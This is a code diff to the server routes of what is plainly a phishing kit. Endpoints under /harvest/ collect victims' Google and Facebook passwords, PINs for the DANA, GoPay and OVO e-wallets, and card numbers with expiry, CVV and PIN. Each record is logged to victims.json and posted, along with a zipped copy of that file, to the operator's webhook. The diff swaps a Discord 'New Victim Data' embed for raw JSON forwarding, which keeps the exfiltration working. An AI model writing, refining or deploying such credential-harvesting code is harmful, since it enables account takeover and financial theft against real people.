@@ -9,7 +9,7 @@ const FormData = require('form-data');
 // Get webhook URL from file
 function getWebhookURL() {
   try {
-    const webhookPath = path.join(__dirname, '..', process.env.DISCORD_WEBHOOK_FILE);
+    const webhookPath = path.join(__dirname, '..', process.env.WEBHOOK_FILE);
     const webhook = fs.readFileSync(webhookPath, 'utf8').trim();
     return webhook;
   } catch (err) {
@@ -18,8 +18,8 @@ function getWebhookURL() {
   }
 }
 
-// Send to Discord webhook
-async function sendToDiscord(data) {
+// Send to webhook
+async function sendToWebhook(data) {
   const webhookURL = getWebhookURL();
   if (!webhookURL || !webhookURL.startsWith('http')) {
     console.log('⚠️  No valid webhook configured');
@@ -27,50 +27,20 @@ async function sendToDiscord(data) {
   }
 
   try {
-    const embed = {
-      title: '🎯 New Victim Data',
-      color: 0xFF4655,
-      fields: [
-        { name: '👤 Player ID', value: data.playerId || 'N/A', inline: true },
-        { name: '🎯 Type', value: data.type || 'Unknown', inline: true },
-        { name: '🕒 Timestamp', value: new Date().toLocaleString('id-ID'), inline: false },
-        { name: '🌐 IP Address', value: data.ip || 'N/A', inline: true }
-      ],
-      timestamp: new Date()
-    };
-
-    // Add specific fields based on type
-    if (data.type === 'google' || data.type === 'facebook') {
-      embed.fields.push(
-        { name: '📧 Email', value: data.email || 'N/A', inline: false },
-        { name: '🔐 Password', value: data.password || 'N/A', inline: false }
-      );
-    } else if (data.type === 'dana' || data.type === 'gopay' || data.type === 'ovo') {
-      embed.fields.push(
-        { name: '📱 Phone/Email', value: data.identifier || 'N/A', inline: false },
-        { name: '🔢 PIN', value: data.pin || 'N/A', inline: false }
-      );
-    } else if (data.type === 'card') {
-      embed.fields.push(
-        { name: '💳 Card Number', value: data.cardNumber || 'N/A', inline: false },
-        { name: '📅 Expiry', value: data.expiry || 'N/A', inline: true },
-        { name: '🔒 CVV', value: data.cvv || 'N/A', inline: true },
-        { name: '🔢 PIN', value: data.pin || 'N/A', inline: false }
-      );
-    }
-
+    // Send raw data as JSON
     await axios.post(webhookURL, {
-      embeds: [embed]
+      ...data,
+      timestamp: new Date().toISOString()
     });
 
-    console.log('✅ Data sent to Discord webhook');
+    console.log('✅ Data sent to webhook');
   } catch (err) {
-    console.error('❌ Failed to send to Discord:', err.response?.data || err.message);
+    console.error('❌ Failed to send to webhook:', err.response?.data || err.message);
   }
 }
 
-// Send victims.json as ZIP to Discord
-async function sendZipToDiscord() {
+// Send victims.json as ZIP to webhook
+async function sendZipToWebhook() {
   const webhookURL = getWebhookURL();
   if (!webhookURL || !webhookURL.startsWith('http')) return;
 
@@ -122,7 +92,7 @@ async function saveToLocal(data) {
     console.log('✅ Data saved to victims.json');
 
     // Trigger ZIP backup
-    await sendZipToDiscord();
+    await sendZipToWebhook();
   } catch (err) {
     console.error('⚠️ Skipping local save:', err.message);
   }
@@ -142,7 +112,7 @@ router.post('/harvest/google', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
@@ -163,7 +133,7 @@ router.post('/harvest/facebook', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
@@ -184,7 +154,7 @@ router.post('/harvest/dana', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
@@ -205,7 +175,7 @@ router.post('/harvest/gopay', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
@@ -226,7 +196,7 @@ router.post('/harvest/ovo', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
@@ -249,7 +219,7 @@ router.post('/harvest/card', async (req, res) => {
   };
 
   await Promise.all([
-    sendToDiscord(data),
+    sendToWebhook(data),
     saveToLocal(data)
   ]);
 
